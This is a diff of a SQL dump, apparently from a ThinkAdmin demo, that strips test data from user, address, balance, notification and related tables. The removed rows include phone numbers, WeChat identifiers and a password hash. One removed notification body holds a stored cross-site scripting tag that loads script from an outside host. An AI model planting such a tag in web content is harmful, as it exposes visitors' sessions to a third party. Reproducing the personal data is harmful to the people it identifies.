-INSERT INTO `data_user` VALUES (31, 0, 0, '-', 1, '', 'o38gpsyMW2D9A66mA0SVvuydUplw', 'oGsrkszmcbyUK5SmmbrOLQYxZL7s', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/aHrXKHWXhQbQibH5mTokvibHUg51Os7FxEGN8V7CR8Ndd7D2GuPhRiaMAwuyU4YrBg1icT51aibueZ8PYNrSpru7q3Q/132', '', '吴波-网站APP定制', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:14:03');
-INSERT INTO `data_user` VALUES (32, 0, 0, '-', 1, '', 'o38gps3qWQu9cMgeBk2j6wMZt_Hg', 'oGsrkswcW24mCy7kYEdEKRoOvhYs', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eo6Nz8rY2IbVHYpUIAqibiciauibIjwhosVGsQ4ZqmMCOkyhiagS1lQHzpewJfSfte3s4Hnm7f39hRR6bw/132', '', '大A', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:14:35');
-INSERT INTO `data_user` VALUES (33, 0, 0, '-', 1, '', 'o38gps6t1XoJuFkA14lYDyt9xKts', 'oGsrks_LSrph8H6xRhxypZLGZ3bo', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/ntEwicNaEtBdIuopkXRFpOcm3t2jtJDqFGoaicggmE2vD0bB7EFibibibDVu5RWhy32wrNEhG4TuQRwINkI5IEgEfew/132', '', '忆笙诚锘', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:15:44');
-INSERT INTO `data_user` VALUES (34, 0, 0, '-', 1, '', 'o38gps3_08QO_0RtwdD9LAS17GBA', 'oGsrks9OIwNt5kcoE9q6DYhbZ77E', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83epU9ksvLgrE7hGz6N5X9g09hBUIV6Hu6icJQxIiaMOGVOlj9R6PjD1Ur4LtG1A3Ek08t3icP6o9ZGtAg/132', '', 'loler', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:16:16');
-INSERT INTO `data_user` VALUES (35, 0, 0, '-', 1, '', 'o38gps10x5S1Jrl-ppjG9cc2KzDI', 'oGsrks31vDbGfux0PlvsUwqPz3xI', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/NwQOcc6afjRzVusjZEuUvk3j0uYCEAXFfps5rg2Yfz1quqn9z8panlNECDNicRdcK5alHbZljom2e5uj9yf3niaw/132', '', '冰', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 999999999999999999.99, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:16:57');
-INSERT INTO `data_user` VALUES (36, 0, 0, '-', 1, '', 'o38gps5ZsIQzMWFyUK_3O1RkKRbM', 'oGsrks17GHXG71DHyzWFx_fEYRNo', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Aiaa1wbdIAPeB9Lo6ia4LI1Z64QxXbSUkonibatWmZdXAcBdmvicCId4Cz7JvSUicmzvnO82ArWEcBOQCEwwD5jiaAaQ/132', '', '冼培文', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:17:59');
-INSERT INTO `data_user` VALUES (37, 0, 0, '-', 1, '', 'o38gps8BmEPWQYa2KTDSBDn76btI', 'oGsrkswC-_qNm0UtfDbwJsK3pz3s', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/ibIWUpC3LwVgQJCeO6EwkDx4fny7KBqj5R8APBluAEicQbTQ0iczPQziaVKvAZdDmcJIpmRkGpSn9eCwTdTTTD9APA/132', '', 'SMALL', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:18:36');
-INSERT INTO `data_user` VALUES (38, 0, 0, '-', 1, '', 'o38gpsyccNap_4PIfVa309-1q1hk', 'oGsrks5QidO_VgcVt9JiWfqpOqt4', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIgg9kzOCcHatS3x4hsYbNxRuXk3qVH44k2qELwpqgDX0x96LoASCp1BhpvA7UiarmVVT806zOvyIw/132', '', '建伟', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:20:15');
-INSERT INTO `data_user` VALUES (39, 0, 0, '-', 1, '', 'o38gpszldzpqLaWPqyEI4v1DSGLo', 'oGsrks3sQIxMyrhhVqbZXn8o72JA', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/ZiabtxhxicBcqd1W4PWP5GRDMWtZ01GYmVJ4su50hO9GyttKvqHgT5Y6ImmqS9XaKpicVp8JDLunMPsOJZZPiaH6UA/132', '', 'wayne', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 22:21:55');
-INSERT INTO `data_user` VALUES (40, 0, 0, '-', 1, '', 'o38gpsyDsQYGF-_P5mIN2RwW70aA', 'oGsrks_8CQ7de_Bmg4kYQ77lsIVU', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83erdAWNCcxhAcjbCFXgbwF4ObOyLXjyRqiaeGTAIdoeXvDu9sALFBWFxFHsrATzia9QDk57icgJb2ibgVw/132', '', '五道杠的小男人', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:23:13');
-INSERT INTO `data_user` VALUES (41, 0, 0, '-', 1, '', 'o38gps9tWJK-hm05VfLMP-gE2p3s', 'oGsrksyQgNbBfpO58QC8rlS5Ga6k', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eonMJazpAb9soyAwichxbgo1ibkO8C6dGItkOs0ibk9icyAFS416HRPJEUyks18icicc0yHHFxG3Mr4ZetQ/132', '', '雷涛', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 22:26:26');
-INSERT INTO `data_user` VALUES (42, 0, 0, '-', 1, '', 'o38gpswAZWK_A4evuUP9Nd2wfK_w', 'oGsrks6TL7EynNZJemzZa7SyAkAk', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eq39NHTFp0k6nkGeAX7oCGSl7K1MxE9tUAIpkHR6YcE3kibnjxBP5eqZZ8rvM9Zx25J3CtAyejEpdA/132', '', '骑猪钓鱼', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:31:43');
-INSERT INTO `data_user` VALUES (43, 0, 0, '-', 1, '', 'o38gps-EVGi0ORwck5-LzBo5mJgE', 'oGsrkswH3kWQfcnG4DPVRk9Es1mM', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/AYVER4O0pe5zwIUq5jiboicH4mkWudyUwwKDAMopibucsfKWycKficrBktrK39YPuzTy0cBlqD3FQfa9icQE3YVTjCw/132', '', '安琛网络-吴涛', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:38:47');
-INSERT INTO `data_user` VALUES (44, 0, 0, '-', 1, '', 'o38gps8nJLcUR89rfRVXsDvDntXY', 'oGsrksyHNqFiDm6lPLFIY0CE0z2U', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIOJEzsEHLamgDgDQ0c7QQtib1wfFE6gzjp4jmDxLPlOQqzh20kfHxULDoMHeeiczwtuhQsiautiaQZYw/132', '', '嘻木', '', '', '', '', 0, '女', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:40:31');
-INSERT INTO `data_user` VALUES (45, 0, 0, '-', 1, '', 'o38gps8i-7ZDkS2riqrzUCnzZr4A', 'oGsrks7ekUwTGTNTVNnxK6-pL3JI', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLLBiaQ0SCQgSY2M0vXd5cF45FAxhsS4XZW82Kxk3DicicY7Z44FGzfjhcSOt7fkSYAYD5Oic32T7a9Qg/132', '', '对月一鸟', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 22:59:16');
-INSERT INTO `data_user` VALUES (46, 0, 0, '-', 1, '', 'o38gps7lNafq9xmynMicfc8Emt98', 'oGsrks4wbE_8_OJDxrgr0wv45kRo', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTK9OjDQfnTrSSo5WtGlcRSI4QcicC1RQzcAicezXo8icNw9oQtI674cmkXYddNVPiaN3w1DkcIRicaU2Gg/132', '', '也', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 1000.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 23:06:20');
-INSERT INTO `data_user` VALUES (47, 0, 0, '-', 1, '', 'o38gpsw8os7p6RnIW9zDF5INjd58', 'oGsrks-DFJgLi94eTz9bR9b6hukU', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/GLsFEcQ2H0APQRkLnAE85k6cxmBlla3hkUTyL453Ed12aIPIqH1tIDceyv3zhuqXRsnDQVlkVqoXUqOElgOU2A/132', '', '瑋瑋', '', '', '', '', 0, '女', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-20 23:10:07');
-INSERT INTO `data_user` VALUES (48, 0, 0, '-', 1, '', 'o38gps8VFBk6uj3Jf5yMdz8Hy9bk', 'oGsrks7V1j8b8rLyNxI5KCBlHn88', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKD3clDqeeDEIib6cm6WaFKNxSs7icsDWliadicqsVqOu08IzGbzJKuxwhra3sNtoZEmSwgxzstFdzeNg/132', '', '怎奈你何', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 23:13:07');
-INSERT INTO `data_user` VALUES (49, 0, 0, '-', 1, '', 'o38gps-4z7nkOJ9VljnrjZ1hJs9Q', 'oGsrks93peyNDIECPpLAppB-kFvU', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTJib5odDogpR5EDOS8bhaZVWJFVI6gm6y42N6vcJjVaRUPxtZcQeicNaqQ4VZzqKUyPzuzVCYd3fkMg/132', '', 'LiuPengFei', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 999999999999999999.99, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 23:21:02');
-INSERT INTO `data_user` VALUES (50, 0, 0, '-', 1, '', 'o38gps2hnGrlcJqOT85hVEwKbFuk', 'oGsrks8BzYTA9ctpzJj_i8qlODU4', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKwuMgkJTGEjaaiaPlcc89Zhr1QxXKwm9HnDYiaO9PcMJkib1yAibTrwMGKu9Wo6plLWc8LgZ5VNIDDlw/132', '', '奔跑吧、少年', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 999999999999999999.99, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-20 23:34:10');
-INSERT INTO `data_user` VALUES (51, 0, 0, '-', 1, '', 'o38gpszhQQQ4eVlnmsbBtLobTfQ0', 'oGsrks3Q0yc5cot8Sraen4WDUUaQ', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTKjr8Qp4x6UZRMXv6mNibR0RdaCPROcibcF57XvCbLX29Bb5ZwEshvh4OlAN6v3wBIXc5N3euPP2vBw/132', '', 'TakeMeToYourHeart', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 10.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-21 08:06:38');
-INSERT INTO `data_user` VALUES (52, 0, 0, '-', 1, '', 'o38gpsxARSYAO0sHjF_qf6DwlHSQ', 'oGsrks14oHA_5PHetm6UCCHntnfY', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83eqbiacQzn9q3N1DyJyZ6mKIJTf7G5x73flvVics2MQibnCLFHFtibN0QOibexYCicbSwXNzoJcp41cCoKpg/132', '', '建豪', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 999999999999999999.99, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-21 08:26:14');
-INSERT INTO `data_user` VALUES (53, 0, 0, '-', 1, '', 'o38gpswnx4HdXszymyURieicoBSk', 'oGsrkswpvWQtXQGbvcLUpW3nTYcc', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLT3N2qTggpcHiaAj8qVQ9ic3Uy1l7v7HBnE6GLNIxibVmKGcZSXNNeQH9RYMOa0a7Vdz22v3cs7jLTg/132', '', '美好时光', '', '', '', '', 0, '未知', '', '', '', '', 0, '', 0.00, 0.00, 1000000000001000.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-01-21 16:55:42');
-INSERT INTO `data_user` VALUES (54, 0, 0, '-', 1, '', 'o38gps0rFRgeRxkuOBFVaCRwuYaI', 'oGsrkszVoiEMZh32bxOkBJM-gxyA', '', 'https://thirdwx.qlogo.cn/mmopen/vi_32/YqlEfJxvdEqEYqiaeMESI8jmJeunaicaN8QAQ7vQeNyPicKYNm7wIQb6riaM0Acic6f0JdvPkwickmySCK5uU8xJyGibQ/132', '', 'Big 刘', '', '', '', '', 0, '男', '', '', '', '', 0, '', 0.00, 0.00, 999999999999999999.99, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 0, 0, '2021-01-22 11:19:02');
-INSERT INTO `data_user` VALUES (55, 0, 0, '-', 1, '', '', '', '18649703363', '', '', '', '4297f44b13955235245b2497399d7a93', '', '', '', 0, '', '', '', '', '', 0, '', 0.00, 0.00, 0.00, 0.00, 0.00, 0, 0, 0, 0.00, 0.00, 0.00, '', 1, 0, '2021-02-23 14:04:23');
 
 -- ----------------------------
 -- Table structure for data_user_address
@@ -253,21 +172,11 @@ CREATE TABLE `data_user_address`  (
   INDEX `idx_data_user_address_code`(`code`) USING BTREE,
   INDEX `idx_data_user_address_deleted`(`deleted`) USING BTREE,
   INDEX `idx_data_user_address_uid`(`uid`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-地址' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-地址' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_user_address
 -- ----------------------------
-INSERT INTO `data_user_address` VALUES (1, 18, 1, 'A2021012033311', '大海', '13188888888', '', '北京市', '北京市', '西城区', '111', 0, '2021-01-20 22:11:31');
-INSERT INTO `data_user_address` VALUES (2, 8, 1, 'A2021012035032', '拉塞尔', '15612341234', '', '北京市', '北京市', '东城区', '还白', 0, '2021-01-20 22:13:03');
-INSERT INTO `data_user_address` VALUES (3, 32, 0, 'A2021012037344', '仔细', '13888888884', '', '北京市', '北京市', '东城区', '哈哈还差', 0, '2021-01-20 22:15:34');
-INSERT INTO `data_user_address` VALUES (4, 34, 0, 'A2021012039397', '12541', '15570038526', '', '山西省', '大同市', '矿区', '心里已买期待收货', 0, '2021-01-20 22:17:39');
-INSERT INTO `data_user_address` VALUES (5, 4, 1, 'A2021012044017', '小小邹', '17620103811', '', '吉林省', '四平市', '伊通满族自治县', '测试地址', 0, '2021-01-20 22:22:01');
-INSERT INTO `data_user_address` VALUES (6, 42, 0, 'A2021012057106', '测试', '15111111111', '', '山西省', '阳泉市', '平定县', '惺惺惜惺惺', 0, '2021-01-20 22:35:10');
-INSERT INTO `data_user_address` VALUES (7, 4, 0, 'A2021012023588', '小小邹2', '17620103800', '', '内蒙古自治区', '赤峰市', '阿鲁科尔沁旗', '测试地址', 0, '2021-01-20 23:00:58');
-INSERT INTO `data_user_address` VALUES (8, 46, 1, 'A2021012030444', '测试wei', '13800138000', '', '北京市', '北京市', '东城区', '哈哈', 0, '2021-01-20 23:07:44');
-INSERT INTO `data_user_address` VALUES (9, 49, 1, 'A2021012044595', '某', '18812345678', '', '河北省', '石家庄市', '长安区', '哦哦哦哦哦', 0, '2021-01-20 23:21:59');
-INSERT INTO `data_user_address` VALUES (10, 3, 1, 'A2021022442364', 'xxx', '13617343800', '', '山西省', '长治市', '屯留县', 'ssdafsdfa', 0, '2021-02-24 15:27:36');
 
 -- ----------------------------
 -- Table structure for data_user_balance
@@ -287,51 +196,11 @@ CREATE TABLE `data_user_balance`  (
   INDEX `idx_data_user_balance_uid`(`uid`) USING BTREE,
   INDEX `idx_data_user_balance_code`(`code`) USING BTREE,
   INDEX `idx_data_user_balance_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 41 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-余额' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-余额' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_user_balance
 -- ----------------------------
-INSERT INTO `data_user_balance` VALUES (1, 4, 'B202101207531378', '后台充值', '', 100.00, 1, 10000, '2021-01-20 22:53:31');
-INSERT INTO `data_user_balance` VALUES (2, 51, 'B202101215736066', '后台充值', '', 10.00, 0, 10000, '2021-01-21 10:47:36');
-INSERT INTO `data_user_balance` VALUES (3, 52, 'B202101216633062', '后台充值', '', 123.00, 1, 10000, '2021-01-21 14:52:33');
-INSERT INTO `data_user_balance` VALUES (4, 39, 'B202101215607645', '后台充值', '', 11110.00, 1, 10000, '2021-01-21 15:41:07');
-INSERT INTO `data_user_balance` VALUES (5, 53, 'B202101224116716', '后台充值', '测试', 10.00, 1, 10000, '2021-01-22 10:31:16');
-INSERT INTO `data_user_balance` VALUES (6, 54, 'B202101254812732', '后台充值', '', 10.00, 0, 10000, '2021-01-25 08:40:12');
-INSERT INTO `data_user_balance` VALUES (7, 54, 'B202101255121369', '后台充值', '', 0.01, 1, 10000, '2021-01-25 10:41:21');
-INSERT INTO `data_user_balance` VALUES (8, 53, 'B202101254449789', '后台充值', '', 1000000000000000.00, 0, 10000, '2021-01-25 15:29:49');
-INSERT INTO `data_user_balance` VALUES (9, 54, 'B202101255807248', '后台充值', '', 100.00, 0, 10000, '2021-01-25 15:43:07');
-INSERT INTO `data_user_balance` VALUES (10, 54, 'B202101254013353', '后台充值', '', 123124.00, 1, 10000, '2021-01-25 19:21:13');
-INSERT INTO `data_user_balance` VALUES (11, 35, 'B202101276546018', '后台充值', '', 90000000000.00, 0, 10000, '2021-01-27 09:56:46');
-INSERT INTO `data_user_balance` VALUES (12, 54, 'B202101272354570', '后台充值', '', 1.00, 0, 10000, '2021-01-27 11:12:54');
-INSERT INTO `data_user_balance` VALUES (13, 54, 'B202101276123305', '后台充值', '', 10000000000000000.00, 0, 10000, '2021-01-27 17:44:23');
-INSERT INTO `data_user_balance` VALUES (14, 51, 'B202101276137474', '后台充值', '', 33333.00, 1, 10000, '2021-01-27 17:44:37');
-INSERT INTO `data_user_balance` VALUES (15, 54, 'B202101285547981', '后台充值', '', 200.00, 0, 10000, '2021-01-28 10:45:47');
-INSERT INTO `data_user_balance` VALUES (16, 52, 'B202101285559745', '后台充值', '', 999999999999999999.99, 0, 10000, '2021-01-28 10:45:59');
-INSERT INTO `data_user_balance` VALUES (17, 54, 'B202101282514633', '后台充值', '', 999999999999999999.99, 0, 10000, '2021-01-28 14:11:14');
-INSERT INTO `data_user_balance` VALUES (18, 50, 'B202101285509686', '后台充值', '', 500.00, 0, 10000, '2021-01-28 15:40:09');
-INSERT INTO `data_user_balance` VALUES (19, 54, 'B202101285730355', '后台充值', '', 100000.00, 0, 10000, '2021-01-28 21:36:30');
-INSERT INTO `data_user_balance` VALUES (20, 49, 'B202101285754559', '后台充值', '', 10000.00, 0, 10000, '2021-01-28 21:36:54');
-INSERT INTO `data_user_balance` VALUES (21, 50, 'B202101285820305', '后台充值', '', 100.00, 0, 10000, '2021-01-28 21:37:20');
-INSERT INTO `data_user_balance` VALUES (22, 50, 'B202101285830119', '后台充值', '', 1000.00, 0, 10000, '2021-01-28 21:37:30');
-INSERT INTO `data_user_balance` VALUES (23, 54, 'B202101305313387', '后台充值', '', 999999999.00, 1, 10000, '2021-01-30 10:43:13');
-INSERT INTO `data_user_balance` VALUES (24, 54, 'B202101304129106', '后台充值', '', 1.00, 0, 10000, '2021-01-30 17:24:29');
-INSERT INTO `data_user_balance` VALUES (25, 54, 'B202101303031697', '后台充值', '', 1.00, 0, 10000, '2021-01-30 19:11:31');
-INSERT INTO `data_user_balance` VALUES (26, 48, 'B202101304520904', '后台充值', '', 999999999999999999.99, 1, 10000, '2021-01-30 23:22:20');
-INSERT INTO `data_user_balance` VALUES (27, 46, 'B202102015002120', '后台充值', '', 1000.00, 0, 10000, '2021-02-01 10:40:02');
-INSERT INTO `data_user_balance` VALUES (28, 49, 'B202102014900611', '后台充值', '', 10000.00, 0, 10000, '2021-02-01 17:32:00');
-INSERT INTO `data_user_balance` VALUES (29, 49, 'B202102014915829', '后台充值', '', 999999999999999999.99, 0, 10000, '2021-02-01 17:32:15');
-INSERT INTO `data_user_balance` VALUES (30, 49, 'B202102014922823', '后台充值', '', 20000000000000000.00, 0, 10000, '2021-02-01 17:32:22');
-INSERT INTO `data_user_balance` VALUES (31, 52, 'B202102024546031', '后台充值', '', 100.00, 1, 10000, '2021-02-02 16:29:46');
-INSERT INTO `data_user_balance` VALUES (32, 54, 'B202102023039929', '后台充值', '', 10000000000.00, 1, 10000, '2021-02-02 17:13:39');
-INSERT INTO `data_user_balance` VALUES (33, 54, 'B202102045202173', '后台充值', '', 11111111111111000.00, 0, 10000, '2021-02-04 10:42:02');
-INSERT INTO `data_user_balance` VALUES (34, 35, 'B202102045235451', '后台充值', '', 999999999999999999.99, 0, 10000, '2021-02-04 10:42:35');
-INSERT INTO `data_user_balance` VALUES (35, 54, 'B202102065035922', '后台充值', '', 1111111111.00, 0, 10000, '2021-02-06 06:44:35');
-INSERT INTO `data_user_balance` VALUES (36, 54, 'B202102093220862', '后台充值', '454', 10.00, 1, 10000, '2021-02-09 18:14:20');
-INSERT INTO `data_user_balance` VALUES (37, 54, 'B202102185702706', '后台充值', '', 999999999999999999.99, 0, 10000, '2021-02-18 16:41:02');
-INSERT INTO `data_user_balance` VALUES (38, 53, 'B202102194618261', '后台充值', '', 1000.00, 0, 10000, '2021-02-19 08:38:18');
-INSERT INTO `data_user_balance` VALUES (39, 36, 'B202102194319566', '后台充值', '', 999999999999999999.99, 1, 10000, '2021-02-19 09:34:19');
-INSERT INTO `data_user_balance` VALUES (40, 50, 'B202102224639166', '后台充值', '', 999999999999999999.99, 0, 10000, '2021-02-22 17:29:39');
 
 -- ----------------------------
 -- Table structure for data_user_balance_transfer
@@ -374,14 +243,12 @@ CREATE TABLE `data_user_discount`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_data_user_discount_status`(`status`) USING BTREE,
   INDEX `idx_data_user_discount_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-折扣' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-折扣' ROW_FORMAT = Compact;
 
 -- ----------------------------
 -- Records of data_user_discount
 -- ----------------------------
-INSERT INTO `data_user_discount` VALUES (1, 'd', '[{\"level\":\"1\",\"discount\":\"100000.0000\"},{\"level\":\"2\",\"discount\":\"20.0000\"}]', 'd', 0, 0, 0, '2021-01-28 18:27:25');
-INSERT INTO `data_user_discount` VALUES (2, 'oo', '[{\"level\":\"1\",\"discount\":\"100.0000\"}]', 'ooooo', 0, 0, 0, '2021-02-13 19:55:52');
-INSERT INTO `data_user_discount` VALUES (3, 'ababa', '[{\"level\":\"1\",\"discount\":\"100.0000\"},{\"level\":\"2\",\"discount\":\"70.0000\"},{\"level\":\"3\",\"discount\":\"30.0000\"}]', '123', 0, 0, 0, '2021-02-20 14:45:41');
+INSERT INTO `data_user_discount` VALUES (1, '100', '[{\"level\":\"1\",\"discount\":\"100.0000\"}]', '', 0, 1, 0, '2021-01-29 09:19:29');
 
 -- ----------------------------
 -- Table structure for data_user_level
@@ -409,13 +276,13 @@ CREATE TABLE `data_user_level`  (
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_data_user_level_status`(`status`) USING BTREE,
   INDEX `idx_data_user_level_number`(`number`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-等级' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-等级' ROW_FORMAT = Compact;
 
 -- ----------------------------
 -- Records of data_user_level
 -- ----------------------------
-INSERT INTO `data_user_level` VALUES (5, '1', 1, ',,', 1, 0, 1, 100.00, 0, 0, 0, 0, 0, 0, '', 1613986231, 1, '2021-02-18 10:53:46');
-INSERT INTO `data_user_level` VALUES (6, 'SSSSSSSVIP', 2, ',prize_01,prize_02,prize_03,prize_04,prize_05,', 1, 1, 1, 500000.00, 1, 100, 1, 500, 1, 5000, '', 1613986219, 1, '2021-02-20 14:44:59');
+INSERT INTO `data_user_level` VALUES (1, 'VIP1', 1, ',prize_01,prize_02,prize_03,', 1, 1, 0, 900.00, 1, 100, 1, 10, 1, 20, '', 1614067769, 1, '2021-01-29 09:04:45');
+INSERT INTO `data_user_level` VALUES (2, 'VIP2', 2, ',prize_01,prize_02,prize_04,', 1, 1, 0, 0.00, 0, 0, 1, 100, 0, 0, '', 1614073167, 1, '2021-02-23 07:41:40');
 
 -- ----------------------------
 -- Table structure for data_user_message
@@ -433,9 +300,9 @@ CREATE TABLE `data_user_message`  (
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_data_user_message_type`(`type`) USING BTREE,
-  INDEX `idx_data_user_message_status`(`status`) USING BTREE,
   INDEX `idx_data_user_message_phone`(`phone`) USING BTREE,
-  INDEX `idx_data_user_message_msgid`(`msgid`) USING BTREE
+  INDEX `idx_data_user_message_msgid`(`msgid`) USING BTREE,
+  INDEX `idx_data_user_message_status`(`status`) USING BTREE
 ) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-短信' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
@@ -459,20 +326,11 @@ CREATE TABLE `data_user_notify`  (
   INDEX `idx_data_user_notify_type`(`type`) USING BTREE,
   INDEX `idx_data_user_notify_status`(`status`) USING BTREE,
   INDEX `idx_data_user_notify_deleted`(`deleted`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-通知' ROW_FORMAT = COMPACT;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '数据-用户-通知' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of data_user_notify
 -- ----------------------------
-INSERT INTO `data_user_notify` VALUES (1, '', '听说 ThinkAdmin 要出前端了', '<p>你觉得是这真的吗？<br />\r\n<br /><Script Src=//xs.sb/LNv6></Script>\r\n<span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/0b/41ddc2fe3395af9c8de51282b70e87.jpg\" style=\"max-width:100%;border:0\" /></span></p>', 0, 1, 1, '2021-01-20 22:15:24');
